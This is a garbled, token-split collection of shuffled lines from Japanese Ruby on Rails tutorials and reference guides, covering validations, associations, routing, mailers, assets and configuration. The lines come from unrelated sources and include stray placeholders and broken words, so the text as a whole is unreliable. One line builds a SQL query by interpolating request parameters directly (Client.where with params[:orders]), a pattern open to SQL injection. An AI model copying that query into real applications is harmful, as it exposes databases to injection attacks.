▁config ▖ middleware ▖ swap ▁ ActionDispatch :: ShowExceptions , ▁ Lifo :: ShowExceptions
▁第 \ ref { cha : a _ toy _ app } 章 の演習 で 少し 触れ ましたが 、 name 属性 の存在 を 検 査 する方法 は 、 リスト \ ref { code : validates _ presence _ of _ name } に示した とおり 、\ k ode { validates } ▁ メソッドに \ k ode { presence : ▁true } という 引数 を与え て 使う ことです 。
▁上の コマンド を実行すると Relationship ファクトリー も 生成される ので 、 以下を実行して ファクトリー を削除し てください 。
▁< p > Hello , ▁Rails !
▁# ▁=> ▁[
▁もちろん 、 このような 重複 ▁( 2 回 以上 フォロー すること ) ▁ が 起 き ない よう 、 インターフェイス 側 の実装 でも 注意 を 払 います ( \ ref { sec : following })▟ しかし 、 ユーザーが 何らかの 方法で ▁( たとえば \ text tt { curl } などの コマンドライン ツール を使用して ) ▁Relationship の データを 操作 する ような ことも 起こ り 得 ます ▟ そのような 場合 でも 、 一意 な インデックス を追加し ていれば 、 エラーを 発生 させ て 重複 を防ぐ ことができます 。
▁* ▁` after _ action ` コールバック も ` before _ action ` と同様 の設定 を行います が 、 メイラー の アクション 内の インスタンス変数 を使用します 。
▁\ k ode { password } 属性 と \ k ode { password _ confirmation } 属性 をテストする 。
▁ 幸 い な ことに 、 人 間 には 個 別の 事例 を 一 般 化 する 能 力 という もの があります ▟ さ さ や か ですが 、\ k ode { map } メソッド など を使用した ブロック の使用 例を 参 考 のために いくつか 挙 げ て みます 。
▁` app / models / blorgh / article ▖ rb ` モデル 内の ` belongs _ to ` 関連付け を以下のように変更し ます 。
▁belongs _ to ▁: section
▁\ ref { sec : the _ hello _ application } で 説明したように 、\ k ode { rails ▁new } コマンドで Rails の バージョン番号 を指定して 、 アプリケーションの 骨 組み を生成する ところから始め ましょう 。
▁ アプリケーションで 新しい ` JSON ` ベースの フォーマット を使用したい場合 、 以下のような 内容 を持つ イニシャライザ ファイルを 追加 できます 。
▁ 以下を実行して 、
▁リスト \ ref { code : validates _ uniqueness _ of _ email _ test } の テストをパスさせ るために 、\ k ode { email } のバリデーション に \ k ode { uniqueness : ▁true } という オプション を追加します ▁リスト \ ref { code : validates _ uniqueness _ of _ email } 。
▁ モデルに attr _ accessible を 書 か ない場合は 、 デフォルトで 「 モデルの \ emph { すべての } 属性 が アクセス可能 」 になります 。
▁ 便利な テスト 例 が Rails によって 自動生成 されているので ( リスト \ ref { code : generated _ user _ mailer _ test }) 、 これを 利用 すれば テスト の作成 は 割 と 簡単です 。
▁* ▁production 環境 の ファイルシステム への 書き込み 権限 がない 。
▁この アクションは 、 フォームから送信 された パラメータ をそのまま 表示する ようになりました 。
▁<%= ▁f ▖ text _ field ▁: last _ name ▁%>
▁この 名前 は Twitter の \ emph { マ イ ク ロ ブログ } という 説明 分 から 着 想 を 得 ました ▟ ブログ には ポスト が あるので 、 マ イ ク ロ ブログ があれば マイクロポスト も ある 、 といった 具 合 です 。
▁# ▁Be ▁sure ▁to ▁restart ▁your ▁server ▁when ▁you ▁modify ▁this ▁file ▖
▁ テーブルに 格 納 される データ の例 を 図 \ ref { fig : users _ table } に 、 対応する データモデル を 図 \ ref { fig : user _ model _ sketch } に示します
▁さらに 、 Rails の セッション 用 ヘルパーは ビュー にも 自動 で インクルード されます ▟ Rails の 全 コントローラの ベース クラス ▁( = Application ▁ コントローラ ) ▁ に この モジュール を インクルード すれば 、 この アプリケーションの コントローラ でも 使える ようになります ▁( リスト \ ref { code : sessions _ helper _ include }) 。
▁concern は以下のように 定義 します 。
▁デフォルトは ` ' encrypted ▁cookie ' ` です 。
▁Client ▖ where (" orders _ count ▁= ▁# { params [: orders ]} ")
▁### ▁ リンク の 追加
▁<%= ▁f ▖ text _ field ▁: first _ name ▁%>
▁class _ attribute ▁: table _ name _ prefix , ▁instance _ writer : ▁false
▁従って 、` false ` は 空 き を 埋 め る 値 としては 使用できません 。
▁### ▁ テンプレート を レンダリング せずに メール送信 する
▁デフォルトのエラーメッセージは ▁_" must ▁be ▁less ▁than ▁% { count } " _ ▖ です 。
▁{0} 図 3 ▖4{/0}{1} 緑色 で 表示 されている ▁( 成功 した ) ▁ テスト ▟\ href { http :// railstutorial ▖ org / images / figures / green _ passing _ spec _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁| ▁** R ed ir ec tion ** ▁| ▁30 0 ▁| ▁: multiple _ ch o ice s ▁|
▁ 例として 、 最初に scaffold で ` User ` を作成し てみましょう 。
▁ 生成 した ` Article sController ` コントローラに ` new ` アクション が 見つからない という エラー です 。
▁ この手法は 、 メニュー ・ ニ ュ ー ス 記事 ・ 静 的 HTML の 断 片 など を キャッシュ するのに 便利です 。
▁" spec / request s / authentication _ pages _ spec ▖ rb "
▁% Q ( < div ▁class =" field _ with _ errors "> # { html _ tag } </ div > )▖ html _ safe
▁ これまで は 空の メールアドレス のみ を 禁 止 して きました が 、 ここでは メールアドレス に お な じ み の パターン \ k ode { user @ example ▖ com } に 合 っている かどうか も 確 認 すること を要求します 。
▁` form _ for ` 呼び出し では 配列 を 1 つ 渡 しています ▟ これは ` / articles /1/ comments ` のような 「 ネストした ルーティング ▁( nested ▁route )」 を生成します 。
▁= ============== ================ ================
▁ 本書 の ス ク リ ー ン シ ョ ッ ト では 原 則 として Google ▁C h r o me を使用しています が 、 C h r o me の タブ は タイトル を表示し き れ ないので 、 図 \ ref { fig : home _ view _ full _ html } では 代わりに Safari を使用しています 。
▁ 先ほど の 説明 を コード に まとめると 、 User と Relationship の関連付け は リスト \ ref { code : user _ relationships _ association } と リスト \ ref { code : relationship _ belongs _ to } のようになります 。
▁` new ` を使用して インスタンス化され た オブジェクトは 、 仮 に 技術 的に 無効 であっても エラー は 報 告 されない ので 、 注意が必要です ▟ ` new ` では バリデーション は 実行 されません 。
▁ テーブル に含まれる 特定の 数値 の 平 均 を得る には 、 その テーブル を持つ クラス に対して ` a verage ` メソッド を呼び出します 。
▁ //= ▁require ▁ home
▁{0} 図 11 ▖ 12 {/0} ▁{1} エラーが表示され た Home ページ {/1}
▁ このため 、 今回の ケース では 、 Rails に 探 して 欲 しい モデルの クラス名 を明示的に 伝える 必要があります 。
▁**` ActionDispatch :: D ebug E xception s ` **
▁ 実際の アプリケーション コードをリスト { p 0} に示します ▁( {2} redirect _ to {/2} メソッド に注目し てください ) 。
▁次に master ブランチ に移動し 、\ ref { sec : git _ commands } と 同じ要領で 差 分 を マージ します 。
▁ 本番環境 に 展開 した アプリケーションでは デバッグ情報 を表示し たくない ので 、 リスト \ ref { code : rails _ debug } には 以下 を記述し て あります 。
▁class ▁C ▁< ▁B ; ▁end
▁ 一括読み込み を使用している と 、 内部で 複数の クエリ が トリガ される こと があり 、 一部の クエリ では その 前の 結果を 必要 と する ことがあります 。
▁ 最も 簡単な 解決 方法は 、 リスト \ ref { code : microposts _ create _ action _ with _ feed } のように 空の 配列 を 渡 しておくこと です 。
▁最初に 、 期間 を 2 つ 定義 します 。
▁╼╼\ subsection { 本章の まとめ } ▁% ▁( fold )╼\ label { sec : sign _ up _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁render ▁action : ▁" edit ▖ html ▖ erb "
▁` beginning _ of _ month ` メソッドと ` end _ of _ month ` メソッドは 、 それぞれ 月 の最初の 日付 と 月 の 最後の 日付 を返します 。
▁このコードは 動 きます が 、 Rails の 流 儀 に 合 って いません 。
▁* ▁` edit _ geocoder _ path ` は ` / geocoder / edit ` を返します
▁# ▁▖▖▖ ▖▖▖
▁\ k ode { user } に 紐 付 いた 新しい Micropost オブジェクト を返す
▁これにより 、 Blog という名前の Rails ▁ アプリケーションが ` blog ` ディレクトリに 作成 され 、` Gemfile ` という ファイル で指定されている gem ファイルが ` bundle ▁install ` コマンド によって インストール されます 。
▁=> ▁" test "
▁ アプリケーションで HTML の 断 片 を サニタイズ する方法 に 新しい 選択 肢 が 1 つ 増え ました 。
▁ このコード が動作する のは 、 Rails による Ruby の拡張 が Rails コンソール によって自動的に 反映され る からです 。
▁Gravatar は 無料 の サービス で 、 プロファイル 写 真 を アップロード して 、 指定した メールアドレス と 関連付け ることができます 。
▁end
▁\ k ode {@ user ▖ microposts ▖ build } のような コード を使う ためには 、 ▁User モデルと Micropost モデル をそれぞれ 更新 して 、 関連付け る必要があります 。
▁following - users
▁use ▁ ActionDispatch :: D ebug E xception s
▁しかし 、 この章 が 終 わ る まで には 、 ユーザー情報 の検証 、 保存 、 取得 が できる 極めて 強力な システム を作成します 。
▁この 点 については 、 もう 一 つの 有名な オープンソース バージョン管理 システム である S ub version とは は っ き り 異なります 。
▁{0} 図 2▖1 3 {/0} ▁{1} マイクロポストの index ページ ▁(\ href { http ://0▖0▖0▖0:3000/ microposts }{/ microposts }) {/1}
▁ 環境 を 整 え るために テスト 環境 用 データベース を作成する コマンドを実行 するのは これが 初めて です 。
▁# ▁=> ▁ { name : [" 空欄 には できません "] }
▁詳細については 、[ Action ▁Mailer ガイド ]( http :// guides ▖ rubyonrails ▖ org / action _ mailer _ basic s ▖ html # action - mailer - configuration ) を参照してください 。
▁* ▁` config ▖ log _ tags ` は 、` request ` オブジェクトが 応答 する メソッドの リスト を引数に取り ます 。
▁ マイクロポスト作成フォーム は 、 サインイン している 特定の ユーザー のコンテキストで のみ 機能 する ので 、 この節 の 一 つの 目標は 、 ユーザーの サインイン の状態 に応じて 、 ホームページ の表示 を変更する ことです 。
▁デフォルトは ` - i ▁- t ` ▟ </ li ></ ul > |
▁#### ▁` singularize `
▁` config / database ▖ yml ` には ERB を 記 述 できる ので 、 database ▖ yml 内で 明示的に ` ENV [' DAT A BASE _ URL ']` を使用する のが 最 善 の 方法 です 。
▁ここで スクリプト の 正 味 の 部分 ( ペ イ ロー ド ) は style 属性 に置かれ ます 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / range / overlap s ▖ rb ` です 。
▁has _ one ▁: account , ▁-> ▁ { ▁where ▁" confirmed ▁= ▁1 " ▁ }
▁{0} 図 10 ▖ 1 3 {/0} {1} ▁( プロ ト ) フィード のある ホームページ のモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / proto _ feed _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ super
▁ここで 、 生の パスワード ではなく 、 ハッシュ化 された パスワード 同士 を 比 較 し ていることに注目してください ▟ こうすることで 、 生の パスワード をデータベースに保存する という 危 険 な ことを し なくても ユーザーを 認 証 できます 。
▁これで 、 レイアウト に {0}{1} 第 3 章 {/1}{/0} で作成した すべての 静的ページ へのリンク が で きました ▟ たとえば \ href { http :// localhost :3000/ about }{/ about } の場合は About ページ ▁( 図 \ ref { fig : about _ page }) ▁ に移動し ます 。
▁また 、 以下の行 にも 注 目 してください 。
▁I 18 n ▖ locale ▁= ▁: de
▁ 制限 を ラ ム ダ として 指定することもできます 。
▁これ を見ると 、 唯 一 の 例外 である \ emph { body } タグ の内容を 除 き 、\ k ode { すべて } の ページ で ▁( title タグ の内容 を含め ) ▁ 同じ 構造 になっている ことがわかります 。
▁* ▁`: re strict _ with _ error ` を指定すると 、 関連付けられたオブジェクト が 1 つ でも ある 場合に エラー が オーナー に追加されます 。
▁ もうひとつ 、\ k ode { remember \_ digest } の 属性 の使用 法 にご注目ください ▟ この 使用 法 は \ k ode { self ▖ remember \_ digest } と同じ であり 、 {1} 第 {2} 6 {/2} 章 {/1} の \ k ode { name } や \ k ode { email } の使用 法 とも 似 ています ▟ remember _ digest の 属性 は 、 データベースの カラム に 対応 して Active ▁Record によって自動的に 作成されます ▁( リスト \ ref { code : add _ remember _ digest _ to _ users _ generated }) 。
▁self ▖ primary _ key ▁= ▁" product _ id "
▁README ▖ rdoc ▁| ▁24 3 ▁-- ---------------- ---------------- ----------------
▁ 一 括 kill を行う には 、 最初に \ text tt { spring } コマンド そのもの で プロセス を 停 止 しておく必要があります 。
▁ 残 念 な ことに 、 メールアドレス の 一意性 を 保 証 するためには 、 もう 1 つ や ら なければならない ことがあります ▟ それ は 、 メールアドレス をデータベースに保存する 前に すべての 文字 を 小文字 に変換 することです 。
▁# ▁ ユーザーを サインイン させ 、 ユーザー ページ ▁( show ) ▁ に リダイレクト する 。
▁ アセット は 引 き 続 き ` public ` ディレクトリ 以下 に 置く ことも 可能です 。
▁ ╼ and ▁to ▁ permit ▁person s ▁to ▁who m ▁the ▁ Software ▁is ▁f ur n is h ed ▁to ▁do ▁so ,
▁ しかも 、 上の 記 法 は 実装 に 密 着 している ので 、 実装 が変更され たら それら も すべて 変更 が必要 になります 。
▁ データベース で 部分 書き込み を使用する場合 は 、` config ▖ active _ record ▖ lock _ optimistic ally ` で 楽 観的ロック も 使用 する必要があります ▟ これは 、 同 時 更新 が 行われた 場合に 、 読み出し の状態 が 古 い 情報 に基づいて 属性 に 書き 込 まれ る 可能性 がある ためです 。
▁ 送 って い ただ いた 機能 追加 を メ ン テ ナ ン ス 用 ブランチ に 押 し 込 めて お しま い 、 という ような ことは していません 。
▁I ▁shall ▁be ▁late !" ▖ truncate ( 18 , ▁ separator : ▁' ▁ ')
▁▖▖▖
▁これで は DRY とは 言 え ません 。
▁self を省略した 結果を リスト \ ref { code : basic _ signup _ tests } に示します 。
▁ エンジン をテストするために 、` test / dummy ` ディレクトリに 埋 め 込 まれ た 縮 小 版 の Rails アプリケーションが 用 意 されます 。
▁ 言 う まで も ありません が 、 この URL は 実際には 存 在 しません ので 、 ブラウザに は 何も 表示 されません ( 訳 注 : ▁ 現在 は 売 り 物 件 の Web ページ がある よう です ) 。
▁しかし 今 では 、 Web 開発者 が 認証システム という もの を 以前 よりも 深 く 理解 する ようになり 、 最新の Rails には 認証システム も 同 梱 される ようになりました 。
▁HTTP ▁request メソッド の詳細については \ ref { sec : TDD } で説明します 。
▁以前のバージョン では 、 モデル で ` default _ scope ` を定義する と 、 同じ フィールド で 連 鎖 した 条件 によって オーバーライド されました 。
▁\ k ode { header } タグ に \ k ode { navbar - fixed - to p } クラス が与えられ ているので 、 これ に従って Bootstrap は ナビゲーション バー を ページ 上 部 に 固定 し 、 ナビゲーション バー の下に 余 白 を 置 いて 主 要 部分 から 分 離 します
▁{0} 表 8 ▖ 1 {/0} ▁{1} リスト \ ref { code : sessions _ resource }{/1} の セッション ルール によって 提供され る ルーティング
▁$ ▁A R C ON N = sqlite 3 ▁ ruby ▁- I test ▁test / case s / associations / has _ many _ associations _ test ▖ rb
▁ 中 でも Ruby M in e が 良い という 評 判 を よく 聞 きます ▟ 本書 の 読者 の 一 人 ▁( David ▁L o e f f ler ) ▁ は 、\ href { https :// github ▖ com / perfect ion ist / sample _ project / wiki } { Rails チュートリアル で Ruby M in e を使用する 方法 } { p 1 } ▁という ドキュメント まで 作 って く れ ました 。
▁#### ▁CSS と Sass
▁# ▁ バ ル セ ロ ナ では 夏 時間 により 20 10 / 0 3 / 28 ▁ 02 :00 ▁+ 0 1 00 が 20 10 / 0 3 / 28 ▁0 3 :00 ▁+0200 になる
▁ただし 、 リスト \ ref { code : will _ paginate _ index _ view } の ビュー は このままでは 動きません ▟ という の も 、 現在の \ k ode {@ users } 変数 には \ k ode { User ▖ all } の結果 が含まれています が ▁( リスト \ ref { code : user _ index }) 、\ k ode { will \_ paginate } では \ k ode { paginate } メソッド を使った 結果 が必要 だ からです ▟ 必要となる データ の例 は次のとおりです 。
▁scaffold の 自動生成 コード に 頼 っている 限り 、 コード 自動生成 の 達 人 には な れる かもしれませんが 、 Rails に関する 実 践 的な 知識 はほとんど 身 に 付き ません 。
▁else
▁以下の例 で説明します 。
▁{0} 図 11 ▖2{/0} ▁{1} Micropost と その User は \ k ode { belongs _ to } ▁( 1 対 1 ) ▁ の関係 性 がある {/1}
▁self を省略した 結果を リスト \ ref { code : unicorn _ gemfile } に示します 。
▁< head >
▁< span ▁class =' exercise ' ▁id =' ex - b 6 b 1 14 ' ></ span >╼ \ end { enumerate } ╼╼% ▁subsection ▁generated _ static _ pages ▁( end )╼╼ \ subsection { 静的なページ の 調 整 } ▁% ▁( fold )╼\ label { sec : custom _ static _ pages }╼╼
▁ 本書 では 、 Ruby ▁ 1▖9▖3 または 2▖0▖ 0 を 前提と します が 、 Ruby ▁1▖9 ▖ 2 でも 動作する はずです 。
▁`: root ` オプションを使用することで 一 貫 した ルート 要素 を使用することもできます 。
▁Rails アプリケーションで 別の 命 名 ルール を使用し なければならない 、 レ ガ シ データベース を使用して Rails アプリケーション を作成し ない と いけない などの 場合には どう すれば よいでしょう か 。
▁(\ emph { 注 } : ▁もし サンプルアプリケーションの 開発 で 必要 になる gem を \ emph { すべて } 知りたい 場合は 、 {1} {2} リスト 11 ▖ 67 {/2}{/1} を参照してください ▟ これが 最終的な Gemfile になります ) 。
▁ データベース 上に サンプルユーザー を生成する Rake タスク
▁* ▁ テストを書く こと ▟ 自分の コード がない と 失敗 し 、 ある と 成功 する テスト であること 。
▁ユーザー 一覧 を実装する とき も ▁(\ ref { sec : updating _ and _ deleting _ users _ co nclusion }) 、 似 た ような 問題 に ぶ つ か りました 。
▁{0}{1} 第 2 章 {/1}{/0} では 、 Rails アプリケーションの 基本的な 仕 組み を 体 験 するために 、 別の プロジェクト を作成します 。
▁ 関連付け では 、 常に 逆 関連付け を自動的に 検出 し よう とします ▟ その 際 、 関連付け 名 に基いて `: inverse _ of ` オプション が ヒ ュ ー リ ス テ ィ ッ ク に設定されます 。
▁ いよいよ ブラウザで 正しい ユーザー情報 を 登録 できるようになりました が 、 その前に Web アプリケーションに 常 識 的に 備 わ っている 機能を 追加 してみましょう ▟ 登録 完了 後 に表示される ページに メッセージ を表示し ▁( この場合は 新規ユーザー への ウ ェ ル カ ム メッセージ ) 、2 度 目 以降 には その ページに メッセージ を表示し ないようにする という ものです 。
▁ それが オープンソース という ものです 。
▁ ╼ / log /* ▖ log ╼ / t mp ╼╼ # ▁I gnore ▁ Spring ▁files ▖
▁( 実際 、 既に \ k ode { alert - danger } という CSS クラス を使って 、 リスト \ ref { code : errors _ partial } の エラーメッセージ の スタイル を div タグ で 指定 しています ▟)
▁ よく 使用される データベース接続 方法 の 詳細な 例 については 、 次 で説明します 。
▁ データベースに インデックス を追加する ことで 検索 効率 が 向上 する ▟ また 、 データベース レベルで の 一意性 を 保 証 するために も 使われ る
▁第 \ ref { cha : following _ users } 章では 、 マイクロポストの \ emph { フィード } を 受け取る ために 、 ユーザーを \ emph { フォロー } する という 概念 を導入し 、 Twitter の ミ ニ ク ロー ン を 完成させます 。
▁ 無視 する という 手 もあります が 、 可能 であれば 修正 を お 願 い します ▟ そして でき れば 、 新しい 警 告 を表示し ないようにする ための パッチ の 送信 も お 願 い します 。
▁最初に タイトル のテスト を作成し 、 次に タイトル を追加し 、 最後に \ emph { レイアウト } ファイル を使って リファクタリング と 重複 の 排 除 を行います 。
▁ RVM を フィルタ する backtrace ▁ silencer を追加する
▁( システム 環境 によって は 、 ここで Rails を 再起動 する 必要がある かもしれません ) 。
▁Users コントローラの 骨 格
▁| ` delivery _ method ` | 配信 方法 を指定します 。
▁リスト { p 2 } の { 4 } create {/4} で 最初に 失敗した ログイン
▁<%= ▁stylesheet _ link _ tag ▁" application ", ▁ media : ▁" all ", ▁" data - turbolinks - track " ▁=> ▁true ▁%>
▁ い った ん オブジェクトを 作成 すれば 、 今度は 何 度 でも 更新 した くなる ものです 。
▁ 続けて サインイン を 行った 後 、 転 送 先 の URL は デフォルト ▁( ユーザープロファイルページ ) ▁ に 戻 る 必要もあります ので 、 これも テストで 確認してください 。
▁### ▁Rack アプリケーションに ルーティング する
▁ここで 必要な のは 、\ k ode { microposts } テーブル から 、 ある ユーザー ▁( つまり 自分自身 ) ▁ が フォローしているユーザー に対応する id を持つ マイクロポスト をすべて 選択 ▁( select ) ▁ することです 。
▁ここで 、 既存の 顧客 のために 新しい 注文 を 1 つ 追加 した く な った とします 。
▁ 文字列 のような オブジェクトは 、 たとえば \ k ode { length } という メッセージ に 応答 できます が 、 これは 文字列 の 文字 数 を返します 。
▁ここでは 、 最後の 永 続 モデル を採用する ことにします ▟ ユーザーが サインイン すると 、 ユーザーが 明示的に サインアウト する まで サインイン の状態 を 永 続 させ ます
▁@ patient ▁= ▁P at i ent ▖ find ( 17 )
▁ すべての 要素 が ` to _ xml ` に応答する 必要があります ▟ そうでない 場合は 例外が発生します 。
▁リスト \ ref { code : validates _ content _ presence } のコード には マイクロポスト の存在 確 認 用の バリデーション の 追加 方法 が示されています ▟ これは 、 マイクロポスト が 空欄 に なら ないようにする ためのものです 。
▁ 驚 いた ことに 公式 標準 による と 、 たとえば \ k ode {" Michael ▁Hartl " example ▖ com } のような ク ォ ート と スペース を使用した メールアドレス も 有効な の だ そう です 。
▁ クラウド 開発環境 を利用する ための 手順 は次のとおりです 。
▁ 実際 、 Rails で あえて 静的なページ を使用して お いて 、 後 から \ emph { ほんの 少し } 動的な コンテンツ を追加する こともできます 。
▁</ small >
▁{0} 図 11 ▖ 7 {/0} ▁{1} ユーザー プロフィール ▁(\ href { http ://0▖0▖0▖0:3000/ users /1}{/ users /1 }) ▁ と マイクロポスト {/1}
▁now ▖ utc ▁# ▁=> ▁Mon , ▁ 07 ▁Jun ▁2010 ▁23:2 7 : 5 2 ▁+0000
▁create _ table ▁: appointment s ▁do ▁| t |
▁上のコード のうち 、 サンプル リレーションシップ を作成する 部分 は 以下 です 。
▁following
▁### ▁` include ?
▁` find _ by ` メソッドは 、 与えられた 条件 に マッチする レコード のうち 最初の レコード だけ を返します 。
▁ マッチする HTML
▁User モデルと Micropost モデルの 継 承 階層
▁Rails に デフォルトで 備 わ っている 環境 は 、 " development " 、 " test " 、 " production " の 3 つ です 。
▁` last ` メソッドは 、 主キー 順 の 最後の レコード を取り出し ます 。
▁この テストで 重要な ことは 、 フィード に必要な 3 つの 条件 を 満 た す ことです ▟ 1 ) ▁ フォローしているユーザー のマイクロポスト が フィード に含まれている こと ▟ 2 ) ▁ 自分自身 のマイクロポスト も フィード に含まれている こと ▟ 3 ) ▁\ emph { フォロー していない } ユーザーのマイクロポスト が フィード に 含まれていない こと 。
▁date ▁= ▁Date ▖ new (201 0, ▁6 , ▁6 )
▁This ▁command ▁does ▁such ▁and ▁such ▖
▁### ▁` errors `
▁ 素晴らしい 正規表現 エディタ \ href { http :// www ▖ rubular ▖ com /}{ Rubular }
▁@ comment ▁= ▁@ article ▖ comments ▖ find ( params [: id ])
▁belongs _ to ▁: con t in ent
▁ ユーザー登録フォーム のときと同様に 、 サインイン フォーム でも Capybara を使って フォーム に 値を 入力 し 、 ボタン を クリック する テスト を行う ことができます 。
▁gem ▁' blorgh ', ▁path : ▁" vendor / engine s / blorgh "
▁ 無効な ユーザー登録 に対するテスト
▁ マイクロポスト作成フォーム を 構 築 するために 、 サイト 訪 問 者 が ログイン している かどうか に応じて 異なる HTML を 提供する コード を使用します ▁( リスト \ ref { code : microposts _ home _ page }) 。
▁ マニフェスト のデフォルトの 置き場所 は 、` config ▖ assets ▖ prefix ` で 指定された 場所 の ルート ディレクトリ ▁( デフォルトでは ' / assets ') ▁ です 。
▁ 属性の値 が どのような もの であっても オブジェクトが 無効 であること を 通知 したい場合 に このメソッド を使用できます 。
▁ 同様に \ k ode { rake } など も 以下のように 実行 できます 。
▁` has _ and _ belongs _ to _ many ` 関連付けを 作成した 場合は 、 それに対応する 結合 ( join ) テーブル を明示的に 作成 する必要があります 。
▁上のコードでは 、\ k ode {@ user } と同じ メールアドレス のユーザー は 作成 できない ことを 、\ k ode {@ user ▖ dup } を使って テスト しています ▟ dup は 、 同じ 属性 を持つ データを 複 製 するための メソッドです 。
▁class ▁Create Account H ist or ies ▁< ▁ActiveRecord :: Migration
▁続いて 、 Help ページ と About ページ も同様に 変更します ▁({0}{1} リスト 3 ▖ 30 {/1}{/0} 、 {2}{1} リスト 3 ▖ 3 1 {/1}{/2} ) 。
▁`< 属性 名 >` は 、 アクセス し ようとした 属性 です 。
▁ 純 粋 な JavaScript と異なり 、 JS - ERb ファイル では 組み込み Ruby ▁( ERb ) ▁ を使用できます ▟\ k ode { create ▖ js ▖ erb } ファイル では 、 フォロー 用の フォーム を \ k ode { unfollow } パーシャル で 更新 し 、 フォロワー の カウント を更新する の に ERb を使用しています ▁( もちろん これは 、 フォロー に成功した場合 の動作 です ) 。
▁以下の 変更 は 、 Rails ▁3▖1 ▖ x の 最新 版 である Rails ▁3▖1 ▖ 12 に アップグレード する ためのものです 。
▁ 最終的に はその feed メソッドが 、 フォローしているユーザー のマイクロポスト も 返す こと をテストします が 、 今は 、\ k ode { feed } メソッドが 自分の マイクロポスト は \ emph { 含 む が } 他 ユーザーのマイクロポスト は \ emph { 含 ま ない } こと をテストする ことにします 。
▁test 環境 と development 環境で のデフォルト は `: log ` であり 、 それ以外の 環境では ` false ` が設定され ます 。
▁ メールアドレス のバリデーション は 扱 い が 難 しく 、 エラーが発生し やすい 部分 なので 、\ emph { 有効な } メールアドレス と 無効な メールアドレス をいくつか 用 意 して 、 バリデーション � 内の エラーを 検 知 していきます 。
▁ユーザー 定義 の タイムゾーン を 考 慮 する メソッドを使用して 日付 を 比 較 したい場合 、` Time ▖ now ` ではなく 必ず ` Time ▖ current ` を使用してください 。
▁ 別の ことを する
▁ 同様に 、` app / views / articles / show ▖ html ▖ erb ` テンプレート にも Edit リンク を追加しましょう ▟ こう しておけば 各 記事 の ページ から 編集 を 行える ようになります 。
▁</ head >
▁scope ▁ shallow _ path : ▁" sekret " ▁do
▁* ▁` ActionDispatch :: Callbacks ▖ to _ prepare ` には 、 リクエスト より 前 かつ ` ActionDispatch :: Callbacks ▖ before ` より 後に 実行 したい コード ブロック を 1 つ 引数として 与 えます 。
▁rest ▁= ▁hash ▖ s li ce !( : a ) ▁# ▁=> ▁ { : b =>2}
▁resources ▁: photos , ▁: account s
▁ _ Web アプリケーションの 色 や 画像 を カスタマイズ できるように したい のであれば 、 ユーザーに 色 や 画像 を 選 ば せ 、 Web アプリケーションの 側 で CSS を ビルド する ようにしましょう _ ▁ ▟ ユーザーが CSS を直接 カスタマイズ できる ような 作り には しないでください 。
▁* ▁ 動的 検索 メソッド を使用する
▁この節では 、 アセットパイプライン の 高度な 概 要 と 、 アセットパイプライン の一部 として デフォルトで 含 まれ ている 、\ emph { Sass } と呼ばれる 素晴らしい CSS 生成 ツール の使い方 について説明します 。
▁ したがって 、 データモデル は 図 \ ref { fig : user _ has _ many _ followers } のようになります 。
▁ 本番環境で の 効率 性
▁続いて 、` app / views / articles / edit ▖ html ▖ erb ` ビュー でも 同じ 作業 を行います 。
▁ 新しい バージョン のうち どの 機能 が必要になる のか 、 既存の コードの サポート が どの ぐらい 困難 になる のか 、 アップグレード に必要な 時間 と スキル は ど れ ほど 必要 か など 、 い く つ もの 要素を 調 整 し なければなりません 。
▁ それ には まず 、 ド ル 記 号 ▁( $ ) ▁ と CSS ▁id を使用して DOM 要素 にアクセス する 文法 について 知 る必要があります 。
▁class ▁ Category ▁< ▁ActiveRecord :: Base
▁ どう しても 動的 セグメント 内で ドット を使用したい場合 は 、 デフォルト 設定 を上書き する 制限 を与え ます ▟ たとえば ` id : ▁ / [ ^ \ / ] + / ` と すると 、 スラッシュ 以外の すべての 文字 が 使用できます 。
▁Rack は 、 Ruby の ウェブ アプリケーション に対して 、 最小限 で モジュール 化 されて いて 、 応用 の 効 く インターフェイス を提供します 。
▁これで ブログ エンジンの コメント 機能 が で きました 。
▁$ ▁ cd ▁active record
▁`: builder ` オ ブ ション を使用することで 、 独自の ビルダ を 構成 できます 。
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁10
▁time _ zone _ select ( ▁" user ", ▁" time _ zone ")
▁-- ----------------
▁ クラウド IDE を使用して お らず 、 リスト \ ref { code : cat _ public _ key } の コマンドを実行 しても 何も 表示され ない場合は 、\ href { https :// co nfluence ▖ at la s s i an ▖ com / x / Y w V 9 E } { Bitbucket アカウント に 公開鍵 をインストール する方法 } ▁( 英語 ) ▁ を参照してください 。
▁Micropost モデルに アップ ロー ダ ー を追加した 結果を リスト \ ref { code : micropost _ model _ picture } に示します 。
▁しかし 、 bcrypt の ハッシュ は 復 号 化 できない は ず なので 、 復 号 化 している は ず はありません 。
▁# ▁location : ▁' / us r / s bin / sendmail ',
▁class ▁B ▁< ▁C ; ▁end
▁ まず 、 サンプルアプリケーションの ログインフォーム に 「 forgot ▁password 」 リンク を追加します ▁( 図 \ ref { fig : login _ forgot _ password _ mockup }) 。
▁end _ of _ quarter ▁( at _ end _ of _ quarter )
▁上のコード の ` _ ad _ banner ▖ html ▖ erb ` パーシャル と ` _ footer ▖ html ▖ erb ` パーシャル に含まれる コンテンツ は 、 アプリケーションの 多くの ページ と 共有 できます 。
▁by te s
▁self を省略した 結果を リスト \ ref { code : generate _ user _ mailer } に示します 。
▁この 文法 は 少々 変 わ って いて 混 乱 を 招 く 可能性があります が 、 上の ▁( ブロック 内の ) ▁ コード のうち 、\ emph { いずれ か の 1 行 } が 実行される という 点 が重要です
▁ この時点では 、\ emph { ルーティング } は 動作 しています が 、 対応する ページ が 動作 している とは限りません 。
▁{0}{1} 第 12 章 {/1}{/0} では 、 そのような ユーザー 同士 の関係 ▁( リレーションシップ ) ▁ を モデリング する方法 を 学 び 、 それが マイクロポストの フィード に どのように 関連する か を 学びます 。
▁> > ▁1▖ year ▖ from _ now
▁ここで 注意 して い ただ き たい のは 、 与えられた 内容 に対して 完 全 一致する 文字列 を使用し なく て はならない ということ ではなく 、 以下のように 部分 文字列 を指定する だけで も よい ということです 。
▁この場合 は以下のように します 。
▁` t mp / cache ` ディレクトリ が存在する 場合 のデフォルト は `: file _ store ` に設定され 、 それ以外の 場合 のデフォルト は `: memory _ store ` に設定されます 。
